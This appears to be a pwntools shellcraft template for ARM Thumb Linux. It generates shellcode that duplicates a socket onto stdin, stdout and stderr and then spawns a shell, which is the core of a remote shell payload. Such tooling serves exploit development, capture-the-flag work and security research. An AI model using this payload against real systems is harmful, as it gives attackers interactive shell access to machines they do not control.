<% from pwnlib.shellcraft.thumb import linux %>
<%page args="sock = 'r6'"/>
<%docstring>
Args: [sock (imm/reg) = r6]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dupio(sock)}

${linux.sh()}
